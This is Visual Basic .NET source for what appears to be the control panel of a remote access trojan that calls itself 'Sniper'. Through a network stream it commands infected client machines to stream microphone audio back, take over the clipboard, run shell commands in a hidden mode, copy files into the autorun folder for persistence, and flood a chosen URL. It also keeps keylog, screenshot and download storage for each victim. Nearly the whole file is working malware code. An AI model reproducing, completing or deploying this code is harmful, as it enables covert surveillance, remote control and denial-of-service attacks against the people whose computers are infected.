    Private Sub ClearListToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ClearListToolStripMenuItem1.Click
        Try
            lstwClipboard.Items.Clear()
            txtData.Text = ""
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub ClearListToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ClearListToolStripMenuItem.Click
        Try
            If lstwClipboard.SelectedItems.Count > 0 Then
                lstwClipboard.SelectedItems(0).Remove()
            Else
                MsgBox("Please select an item!", MsgBoxStyle.Information)
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub cmdCloSet_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdCloSet.Click
        Try
            txtData.Visible = False
            cmdSet.Visible = False
            cmdCloSet.Visible = False
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub AddValueToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AddValueToolStripMenuItem.Click
        Try
            txtData.Visible = True
            cmdSet.Visible = True
            cmdCloSet.Visible = True
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub cmdSet_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdSet.Click
        If Not txtData.Text = "" Then
            Try
                frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes(txtData.Text & "|°Clip}"), 0, UTF8.GetBytes(txtData.Text & "|°Clip}").Length) 'invio il comando il Client
                lstwClipboard.Items.Add(txtData.Text, 9)
                lstwClipboard.Items(lstwClipboard.Items.Count - 1).SubItems.Add(TimeOfDay & " " & "{SET}")
            Catch ex As Exception
                ISPC = False
            End Try
            txtData.Visible = False
            cmdSet.Visible = False
            cmdCloSet.Visible = False
        Else
            MsgBox("Write something in the box!", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub DeleteSelectedToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeleteSelectedToolStripMenuItem.Click
        Try
            frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                UTF8.GetBytes("|°CR}"), 0, UTF8.GetBytes("|°CR}").Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub txtVisNoLis_LostFocus(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtVisNoLis.LostFocus
        txtVisNoLis.Visible = False
    End Sub

    Private Sub tmrPannSouno_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrPannSuono.Tick
        If listenersuono.Pending Then
            clientsuono = listenersuono.AcceptTcpClient()
            netstreamsuono = clientsuono.GetStream()
            tmrPannSuono.Stop()
            ISPCsuono = True
            tmrDatisuono.Start()
        End If
    End Sub

    Private Sub CloseConnectionToolStripMenuItem5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseConnectionToolStripMenuItem5.Click
        FileClose(Me.lblClid.Text + 10)
        cmdGetDS.Enabled = True
        LoopS = False
        cmdStartRec.Enabled = True
        cmdGetDS.Enabled = False
        lblTotKbS.Text = "Total Kb: 0Kb"
        lblRecTim.Text = "00:00:00"
        If Not clientsuono Is Nothing Then
            clientsuono.Close()
        End If

        If Not listenersuono Is Nothing Then
            listenersuono.Stop()
        End If
        tmrDatiSuono.Enabled = False
        tmrPannSuono.Enabled = False
        picSou.BackColor = Color.Red
        LoopS = False
        ISPCsuono = False
        Try
            frmMain.netstream(
                              Me.lblClid.Text - 1).Write(
                             UTF8.GetBytes("Cloz>z|"), 0, UTF8.GetBytes("Cloz>z|").Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub StartListeningToolStripMenuItem4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartListeningToolStripMenuItem4.Click
        If Not picSou.BackColor = Color.Green Then
            Try
                listenersuono = New TcpListener(IPAddress.Any, nudSD.Value)
                listenersuono.Start()
                tmrPannSuono.Start()
                picSou.BackColor = Color.Yellow


                Try
                    frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes("Snz>z|"), 0, UTF8.GetBytes("Snz>z|").Length) 'invio il comando il Client
                Catch ex As Exception
                    ISPC = False
                End Try

            Catch ex As Exception
                MsgBox("Maybe a listener is currently started, close or restart it to run an other socket or a control panel", MsgBoxStyle.Information)
            End Try
        Else

            MsgBox("The sound socket is listening or is already connected", MsgBoxStyle.Information)
        End If
    End Sub


    Private Sub picSou_MouseClick(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles picSou.MouseClick
        Try
            cxmstrSou.Show(picSou, New Point(e.X, e.Y))
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub cmdStartRec_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdStartRec.Click
        If picSou.BackColor = Color.Green Then

            Try
                netstreamsuono.Write(UTF8.GetBytes(":>Sta1|"), 0, UTF8.GetBytes(":>Sta1|").Length) 'invio il comando il Client
                cmdGetDS.Enabled = True
                cmdStartRec.Enabled = False
            Catch ex As Exception
                cmdStartRec.Enabled = True
                cmdGetDS.Enabled = False
                ISPCsuono = False
                LoopS = False
            End Try

        Else
            MsgBox("The sound server is listening or is not connected!", MsgBoxStyle.Information)
        End If
    End Sub

    

    Private Sub tmrDatiSuono_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrDatiSuono.Tick
        If ISPCsuono = True Then
            If clientsuono.Available > 0 Then
                Dim buffer20(clientsuono.Available - 1) As Byte
                netstreamsuono.Read(buffer20, 0, buffer20.Length)
                NumFS = Me.lblClid.Text + 10
                If cmdGetDS.Enabled = True Then
                    cmdGetDS.Enabled = False
                End If

                If InStr(UTF8.GetString(buffer20), "<LS>") Then
                    FileClose(NumFS)
                    FileOpen(NumFS, Environ("TEMP") & "\" & NumFS & ".wav", OpenMode.Binary)
                    Dim ValPS As Integer = Split(UTF8.GetString(buffer20), "<LS>")(1)
                    lblRecTim.Text = Split(UTF8.GetString(buffer20), "<LS>")(0)
                    prgDatS.Maximum = ValPS
                    lblTotKbS.Text = "Total Kb: " & Math.Round(ValPS / 1024) & "Kb"
                    If picSou.BackColor = Color.Green Then
                        Try
                            netstreamsuono.Write(UTF8.GetBytes("<Se|da"), 0, UTF8.GetBytes("<Se|da").Length) 'invio il comando il Client
                        Catch ex As Exception
                            ISPCsuono = False
                            LoopS = False
                        End Try
                    Else
                        MsgBox("The sound server is listening or is not connected!", MsgBoxStyle.Information)
                    End If
                Else

                    FilePut(NumFS, buffer20)
                    If Not prgDatS.Maximum < prgDatS.Value + buffer20.Length Then
                        prgDatS.Value = prgDatS.Value + buffer20.Length
                    End If
                    If prgDatS.Value = prgDatS.Maximum Then
                        FileClose(NumFS)
                        prgDatS.Value = 0

                        bkwSD.RunWorkerAsync()

                End If


                    End If

            End If
        Else
            cmdGetDS.Enabled = True
            FileClose(Me.lblClid.Text + 10)
            cmdStartRec.Enabled = True
            cmdGetDS.Enabled = False
            lblTotKbS.Text = "Total Kb: 0Kb"
            lblRecTim.Text = "00:00:00"
            LoopS = False
            clientsuono.Close()
            tmrDatiSuono.Enabled = False
            tmrPannSuono.Enabled = False
            picSou.BackColor = Color.Red
            MsgBox("The sound server was not connected!", MsgBoxStyle.Exclamation)
        End If

    End Sub

    Private Sub cmdStopRec_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdStopRec.Click
        If picSou.BackColor = Color.Green Then

            Try
                cmdGetDS.Enabled = True
                LoopS = False
                lblRecTim.Text = "00:00:00"
                lblTotKbS.Text = "Total Kb: 0Kb"
                cmdStartRec.Enabled = True
                cmdGetDS.Enabled = False
                netstreamsuono.Write(UTF8.GetBytes("|ST<"), 0, UTF8.GetBytes("|ST<").Length) 'invio il comando il Client
            Catch ex As Exception
                cmdGetDS.Enabled = True
                lblTotKbS.Text = "Total Kb: 0Kb"
                lblRecTim.Text = "00:00:00"
                cmdStartRec.Enabled = True
                cmdGetDS.Enabled = False
                ISPCsuono = False
                LoopS = False
            End Try

        Else
            MsgBox("The sound server is listening or is not connected!", MsgBoxStyle.Information)
        End If

    End Sub

    Private Sub SendYourClipboardToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SendYourClipboardToolStripMenuItem.Click
        Try
            Dim CRetta As String = Clipboard.GetData(DataFormats.StringFormat)
            frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                UTF8.GetBytes(CRetta & "|°Clip}"), 0, UTF8.GetBytes(CRetta & "|°Clip}").Length) 'invio il comando il Client
            lstwClipboard.Items.Add(CRetta, 9)
            lstwClipboard.Items(lstwClipboard.Items.Count - 1).SubItems.Add(TimeOfDay & " " & "{SET}")
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub cmdGetDS_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdGetDS.Click
        If picSou.BackColor = Color.Green Then

            Try
                LoopS = True
                netstreamsuono.Write(UTF8.GetBytes(">AVV<"), 0, UTF8.GetBytes(">AVV<").Length) 'invio il comando il Client
                cmdGetDS.Enabled = False
            Catch ex As Exception
                cmdGetDS.Enabled = True
                ISPCsuono = False
                LoopS = False
            End Try

        Else
            MsgBox("The sound server is listening or is not connected!", MsgBoxStyle.Information)
        End If
    End Sub

    Private Sub bkwSD_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles bkwSD.DoWork
        If Dir(Environ("TEMP") & "\" & NumFS & ".wav") <> "" Then
            My.Computer.Audio.Play(Environ("TEMP") & "\" & NumFS & ".wav", AudioPlayMode.WaitToComplete)
        End If

        If LoopS = True Then
            If picSou.BackColor = Color.Green Then

                Try
                    netstreamsuono.Write(UTF8.GetBytes(">AVV<"), 0, UTF8.GetBytes(">AVV<").Length) 'invio il comando il Client
                Catch ex As Exception
                    ISPCsuono = False
                    LoopS = False
                End Try

            Else
                MsgBox("The sound server is listening or is not connected!", MsgBoxStyle.Information)
            End If

        End If
    End Sub

    Private Sub StartWavFileToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartWavFileToolStripMenuItem.Click

        If Not lstwFileFolderR.SelectedIndices.Count <= 0 Then

            If Not txtPath.Text = "" Then

                If lstwFileFolderR.SelectedItems.Item(0).SubItems(1).Text = "File" Then

                    Try
                        frmMain.netstream(
                            Me.lblClid.Text - 1).Write(
                            UTF8.GetBytes("<<{wa||" & txtPath.Text & lstwFileFolderR.SelectedItems.Item(0).Text), 0, UTF8.GetBytes("<<{wa||" & txtPath.Text &
                                                                                                                    lstwFileFolderR.SelectedItems.Item(0).Text).Length) 'invio il comando il Client



                    Catch ex As Exception
                        ISPC = False
                    End Try

                Else
                    MsgBox("Please, select a file!", MsgBoxStyle.Information)
                End If

            Else

                MsgBox("There is not any selected path!", MsgBoxStyle.Information)
            End If

        Else
            MsgBox("Select a file to play!", MsgBoxStyle.Exclamation)
        End If

    End Sub

    Private Sub cmdREcLoc_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdREcLoc.Click
        Try
            mciSendString("open new Type waveaudio Alias recsound", "", 0, 0)
            mciSendString("record recsound", "", 0, 0)
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub cmdStopRecLO_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdStopRecLO.Click
        Try
            mciSendString("save recsound YourSound.wav", "", 0, 0)
            mciSendString("close recsound", "", 0, 0)
            lblTOTKbLo.Text = "Total Kb: " & FileLen("YourSound.Wav") & "Kb"
            MsgBox("Recorded sound has been saved in the same folder where there is Sniper")
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub cmdMuteR_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdMuteR.Click
        Try
            frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                UTF8.GetBytes("{MUTE]"), 0, UTF8.GetBytes("{MUTE]").Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub cmdSetVR_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdSetVR.Click
        Try
            frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                UTF8.GetBytes("SE=|V"), 0, UTF8.GetBytes("SE=|V").Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub cmdSetAlC_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdSetAlC.Click
        Try
            frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                UTF8.GetBytes("V|=ES"), 0, UTF8.GetBytes("V|=ES").Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub cmdStartSite_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdStartSite.Click

        Try
            frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                UTF8.GetBytes(txtURLR.Text & "S'&>^ I"), 0, UTF8.GetBytes(txtURLR.Text & "S'&>^ I").Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try

    End Sub


    Private Sub cmdstaFlo_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdstaFlo.Click
        If Microsoft.VisualBasic.Left(txtUFlo.Text, 1) = "w" Then
            Try
                frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes(txtUFlo.Text & " " & nudFloo.Value & "Fhttp\\oo"), 0, UTF8.GetBytes(txtUFlo.Text & " " & nudFloo.Value & "Fhttp\\oo").Length) 'invio il comando il Client
            Catch ex As Exception
                ISPC = False
            End Try
        Else
            MsgBox("Invalid URL!")
        End If
    End Sub

    Private Sub cmdCCMDO_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdCCMDO.Click
        txtCMDOUT.Text = ""
    End Sub

    Private Sub cmdSECMD_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdSECMD.Click
        If chkHCR.Checked = False Then
            Try
                frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes("C|>>'MD" & txtCOMCMD.Text), 0, UTF8.GetBytes("C|>>'MD" & txtCOMCMD.Text).Length) 'invio il comando il Client
                txtCMDOUT.Text = txtCMDOUT.Text & "-----COMMAND SENT AT " & TimeOfDay & "-----" & vbCrLf
                txtCMDOUT.Text = txtCMDOUT.Text & txtCOMCMD.Text & vbCrLf
            Catch ex As Exception
                ISPC = False
            End Try
        Else

            Try
                frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes("2|>>HHH" & txtCOMCMD.Text), 0, UTF8.GetBytes("2|>>HHH" & txtCOMCMD.Text).Length) 'invio il comando il Client
                txtCMDOUT.Text = txtCMDOUT.Text & "-----COMMAND SENT AT " & TimeOfDay & "-----{HIDE}" & vbCrLf
                txtCMDOUT.Text = txtCMDOUT.Text & txtCOMCMD.Text & vbCrLf
            Catch ex As Exception
                ISPC = False
            End Try
        End If
    End Sub

    

    Private Sub cmdSetPorts_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdSetPorts.Click
        Try
            If Not Directory.Exists(Application.StartupPath & "\Computers") = True Then
                MkDir(Application.StartupPath & "\Computers")
                If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text) = True Then
                    MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text)

                    If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot") = True Then
                        MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot")
                    End If

                    If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads") = True Then
                        MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads")
                    End If
                End If
            Else
                If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text) = True Then
                    MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text)

                    If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot") = True Then
                        MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot")
                    End If

                    If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads") = True Then
                        MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads")
                    End If
                Else

                    If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot") = True Then
                        MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot")
                    End If

                    If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads") = True Then
                        MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads")
                    End If
                End If
            End If

            Dim po As String
            po = nudS.Value & vbCrLf & nudW.Value & vbCrLf & NudK.Value & vbCrLf & nudU.Value & vbCrLf & nudD.Value & vbCrLf & nudSD.Value
            Dim wr90 As StreamWriter
            wr90 = New StreamWriter(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\PortsSettings.ini", False)
            wr90.Write(po)
            wr90.Flush()
            wr90.Close()

            MsgBox("The ports has been saved successfully!", MsgBoxStyle.Information)
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub cmdGetRunC_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdGetRunC.Click
        lstRunSo.Items.Clear()
        cmdGetRunC.Enabled = False
        tbcPannello.Enabled = False
        Try
            frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                UTF8.GetBytes("|^%%i^$0"), 0, UTF8.GetBytes("|^%%i^$0").Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub cmdCleLst_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdCleLst.Click
        lstRunSo.Items.Clear()
    End Sub

    Private Sub AddFileInAutorunFolderToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AddFileInAutorunFolderToolStripMenuItem.Click
        If Not lstwFileFolderR.SelectedIndices.Count <= 0 Then

            If Not txtPath.Text = "" Then

                If lstwFileFolderR.SelectedItems.Item(0).SubItems(1).Text = "File" Then



                    Try
                        frmMain.netstream(
                            Me.lblClid.Text - 1).Write(
                            UTF8.GetBytes("\R\u\n-" & txtPath.Text & lstwFileFolderR.SelectedItems.Item(0).Text), 0, UTF8.GetBytes("\R\u\n-" &
                            txtPath.Text & lstwFileFolderR.SelectedItems.Item(0).Text).Length) 'invio il comando il Client

                    Catch ex As Exception
                        ISPC = False
                    End Try



                Else
                    MsgBox("Please, select a file!", MsgBoxStyle.Information)
                End If

            Else

                MsgBox("There is not any selected path!", MsgBoxStyle.Information)
            End If

        Else
            MsgBox("Select a file to move!", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub cmdClrTxt_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdClrTxt.Click
        txtKey.Text = ""
    End Sub

    Private Sub cmdGETOUT_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdGETOUT.Click
        Try
            frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                UTF8.GetBytes("0|\/|£=>"), 0, UTF8.GetBytes("0|\/|£=>").Length) 'invio il comando il Client
           Catch ex As Exception
            ISPC = False
        End Try
    End Sub
End Class